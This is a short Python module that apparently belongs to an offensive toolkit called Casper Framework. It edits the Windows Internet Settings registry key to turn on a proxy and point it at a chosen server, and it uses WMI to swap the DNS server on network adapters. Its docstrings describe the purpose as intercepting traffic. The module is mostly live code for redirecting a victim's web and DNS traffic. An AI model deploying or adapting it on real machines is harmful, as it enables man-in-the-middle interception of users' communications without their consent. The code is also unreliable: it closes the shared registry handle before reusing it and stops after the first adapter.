'''
Part of Casper Framework
'''
from includes import *

HKEY_key = r"Software\Microsoft\Windows\CurrentVersion\Internet Settings"
HKEY_open = OpenKey(HKEY_CURRENT_USER,HKEY_key,0,KEY_ALL_ACCESS)
HKEY_create = CreateKey(HKEY_CURRENT_USER,HKEY_key)

def enable_proxy(dword):
	"""
	enable or disable proxy function within registry
	"""
	try:
		SetValueEx(HKEY_open,"ProxyEnable",0,REG_DWORD,dword)
		CloseKey(HKEY_open)
		return True
	except Exception as e:
		return False

def change_proxy(server,dword):
	"""
	intercept using proxy change > change_proxy("127.0.0.1:8080",0x00000001)
	"""
	if (enable_proxy(dword) == True):
		try:
			SetValueEx(HKEY_open,"ProxyServer",0,REG_SZ,server)
			CloseKey(HKEY_open)
			return True
		except Exception as e:
			return False
	else:
		return False

def change_dns(server):
	"""
	intercept using dns change > change_dns("8.8.8.8")
	https://msdn.microsoft.com/en-us/library/aa393295(v=vs.85).aspx
	"""
	try:
		for interface in wmi.Win32_NetworkAdapterConfiguration(IPEnabled=True):
			set_dns_server = interface.SetDNSServerSearchOrder([server])
			if (set_dns_server[0] == 0):
				return True
			elif (set_dns_server[0] == 1):
				return True
			else:
				return False		
	except Exception as e:
		return False